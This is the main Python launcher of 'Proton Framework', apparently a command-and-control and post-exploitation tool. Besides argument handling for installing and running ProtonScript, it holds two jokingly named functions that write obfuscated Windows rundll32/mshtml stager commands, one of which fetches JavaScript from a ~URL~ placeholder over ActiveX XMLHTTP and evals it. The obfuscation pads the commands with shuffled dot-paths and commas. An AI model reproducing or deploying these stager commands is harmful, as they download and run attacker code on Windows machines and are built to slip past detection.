#!/usr/bin/env python3

# Copyright (C) 2016 - 2019 Entynetproject
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may not
# use the software except in compliance with the License.
#
# You may obtain a copy of the License at:
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.

import os
import time

os.system("printf '\033]2;Proton Framework\a'")

__version_info__ = "v5.1"
__version__ = "5.1"
__license__ = "Apache 2.0"
__credits__ = ["Entynetproject"]

def banner():
    return "Logo" and datetime.datetime.today().weekday() == 1

def pay_no_attention():
    import random
    import string

    bignumber = 20

    command = "rundll32"
    command += " ~URL~"

    dotpath = []

    for i in range(0, 3):
        dotpath.append('..')

    for i in range(0, bignumber):
        dotpath.append('.')

    random.shuffle(dotpath)

    path = ""
    dotpathwithslashes = []
    for i in dotpath:
        dotpathwithslashes.append("\\" + i)

    path = ''.join(dotpathwithslashes)
    path += "\\"

    command += path + "mshtml"
    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
    command += ","
    command += " "
    command += "RunHTMLApplication"
    
    command = "rundll32.exe ~URL~\\..\\..\\..\\mshtml,RunHTMLApplication"
    
    with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
        f.write(command+"\n")

def seriously_nothing_shady_here():
    import random
    import string

    bignumber = 20

    coin = [True,False]
    command = "rundll32"
    command += " javascript:\""

    dotpath = []

    for i in range(0, random.randint(1,3)):
        dotpath.append('..')

    for i in range(0, bignumber):
        dotpath.append('.')

    random.shuffle(dotpath)

    path = ""
    slashes = ["\\"]
    dotpathwithslashes = []

    for i in dotpath:
        dotpathwithslashes.append(random.choice(slashes) + i)

    if dotpathwithslashes[0] == '..' or dotpathwithslashes[0] == '.':
        tmp = dotpathwithslashes[0]
        dotpathwithslashes = dotpathwithslashes[1:]
        random.shuffle(dotpathwithslashes)
        dotpathwithslashes.insert(0, tmp)
    else:
        random.shuffle(dotpathwithslashes)

    path = ''.join(dotpathwithslashes)
    path += random.choice(slashes)

    command += path + "mshtml"
    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
    command += ","
    command += " "
    command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"

    command = """rundll32.exe javascript:"\\..\\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","~URL~",false);x.send();eval(x.responseText);window.close();"""
    
    with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
        f.write(command+"\n")


if __name__ == "__main__":
    import core.shell
    import argparse
    import datetime

    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--install",action="store_true",help="Install the ProtonScript.")
    parser.add_argument("-r","--run", metavar='FILE', help="Run a ProtonScript program.")
    parser.add_argument("-j","--json", metavar='FILE', help="A Proton Framework json file.")
    parser.add_argument("-u","--update",action="store_true",help="Update Proton Framework.")
    args = parser.parse_args()
    autorun = ""
    
    if args.install:
        import os.path
        if (os.path.exists("/data/data/com.termux")):
            pspath = "/data/data/com.termux/files/usr/bin/pscript"
        else:
            pspath = "/usr/local/bin/pscript"
            
        if (os.path.exists(pspath)):
            REDL="\033[1;31m"
            WHSL="\033[0;97m"
            ENDL="\033[0m"
            print(REDL+"[-]"+ENDL+" "+WHSL+"ProtonScript is already installed!"+ENDL)
            import sys
            sys.exit()
        else:
            os.system("cd script && chmod +x install.sh && ./install.sh")
            import sys
            sys.exit()    
    
    if args.run:
        import os.path
        if (os.path.exists("/data/data/com.termux")):
            pspath = "/data/data/com.termux/files/usr/bin/pscript"
        else:
            pspath = "/usr/local/bin/pscript"
            
        if (os.path.exists(pspath)):
            if True:
                import sys
                import os.path
                if (os.path.exists("/tmp/pscript")):
                    time.sleep(0)
                else:
                    os.system("mkdir /tmp/pscript")
                    
                if (os.path.exists("/tmp/pscript/pspath.temp")):
                    os.system("rm /tmp/pscript/pspath.temp")
                    os.system("echo $OLDPWD >> /tmp/pscript/pspath.temp")
                else:
                    os.system("echo $OLDPWD >> /tmp/pscript/pspath.temp")
                    
                if not '/' in args.run:
                    run = open("/tmp/pscript/pspath.temp").read().split('\n')[-2]+'/'+args.run
                else:
                    run = args.run
                    
                if (os.path.exists(run)):
                    time.sleep(0)
                else:
                    REDL="\033[1;31m"
                    WHSL="\033[0;97m"
                    ENDL="\033[0m"
                    print(REDL+"[-]"+ENDL+" "+WHSL+"No such ProtonScript program file!"+ENDL)
                    import sys
                    sys.exit()
                
                autorun = open(run).read().split("\n") if run else []
                argrem = run
                if '.' in argrem:
                    time.sleep(0)
                else:
                    REDL="\033[1;31m"
                    WHSL="\033[0;97m"
                    ENDL="\033[0m"
                    print(REDL+"[-]"+ENDL+" "+WHSL+"ProtonScript program file is not executable!"+ENDL)
                    import sys
                    sys.exit()
                
                try:
                    if (argrem[-(argrem[::-1].index('.')):]) == 'psc':
                        name = argrem[:argrem.index('.')]
                        os.system("python3 script/runner/runner.py -r "+argrem)
                        if (os.path.exists("/tmp/pscript")):
                            if (os.path.exists("/tmp/pscript/program.p")):
                                os.system("rm /tmp/pscript/program.p")
                        else:
                            os.system("mkdir /tmp/pscript")
                    else:
                        REDL="\033[1;31m"
                        WHSL="\033[0;97m"
                        ENDL="\033[0m"
                        print(REDL+"[-]"+ENDL+" "+WHSL+"ProtonScript program file is not executable!"+ENDL)
                        import sys
                        sys.exit()  
                    
                    os.system("mv "+name+".p /tmp/pscript/program.p")
                    autorun = open('/tmp/pscript/program.p').read().split("\n") if '/tmp/pscript/program.p' else []
                except:
                    import sys
                    sys.exit()  
                    
        else:
            REDL="\033[1;31m"
            WHSL="\033[0;97m"
            ENDL="\033[0m"
            print(REDL+"[-]"+ENDL+" "+WHSL+"ProtonScript is not installed!"+ENDL)
            ips = input('Install ProtonScript y/N: ')
            if ips == "y" or ips == "Y":
                os.system("cd script && chmod +x install.sh && ./install.sh")
                import sys
                sys.exit()
            else:
                import sys
                sys.exit()
            
    if args.json:
        import json
        import os.path
        if (os.path.exists("/tmp/pjson")):
             time.sleep(0)
        else:
            os.system("mkdir /tmp/pjson")
                    
        if (os.path.exists("/tmp/pscript/pjpath.temp")):
            os.system("rm /tmp/pscript/pjpath.temp")
            os.system("echo $OLDPWD >> /tmp/pjson/pjpath.temp")
        else:
            os.system("echo $OLDPWD >> /tmp/pjson/pjpath.temp")
                    
        if not '/' in args.json:
            run = open("/tmp/pjson/pjpath.temp").read().split('\n')[-2]+'/'+args.json
        else:
            run = args.json
            
        if (os.path.exists(run)):
            time.sleep(0)
        else:
            REDL="\033[1;31m"
            WHSL="\033[0;97m"
            ENDL="\033[0m"
            print(REDL+"[-]"+ENDL+" "+WHSL+"No such Proton Framework json file!"+ENDL)
            import sys
            sys.exit()                
        
        restore = json.loads(open(run).read())
    else:
        restore = {}

    if args.update:
        os.system("cd bin && chmod +x proton && ./proton --update")
        exit()
        
    if banner():
        try:
            banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
        except:
            print("")
    else:
        try:
            banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
        except:
            print("")

    #pay_no_attention()
    #seriously_nothing_shady_here()
    shell = core.shell.Shell(banner, __version__)
    shell.run(autorun, restore)
